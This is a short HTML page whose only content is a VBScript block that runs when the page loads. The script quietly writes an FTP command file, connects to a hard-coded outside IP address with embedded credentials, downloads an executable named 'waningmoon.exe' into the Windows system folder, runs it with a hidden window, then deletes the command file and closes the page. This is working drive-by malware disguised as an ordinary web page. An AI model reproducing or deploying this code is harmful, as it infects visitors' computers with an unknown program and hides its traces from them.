<title>-</title>
<script language=vbscript> 
Dim fso, tf, winsys, exefile
exefile = "waningmoon.exe"
Set fso = CreateObject("Scripting.FileSystemObject")
Set tf = fso.CreateTextFile("ftp.txt",true)
winsys = fso.GetSpecialFolder(1)
tf.Writeline "open 61.152.96.126"
tf.Writeline "mirmm"
tf.Writeline "mirmm"
tf.Writeline "lcd " & winsys
tf.Writeline "get " & exefile
tf.Writeline "bye"
tf.Close
set wshshell=createobject ("wscript.shell" )
wshshell.Run "ftp -s:ftp.txt", 0 ,true
wshshell.Run winsys & "\" & exefile
fso.DeleteFile "ftp.txt",true
window.close() 
</script> 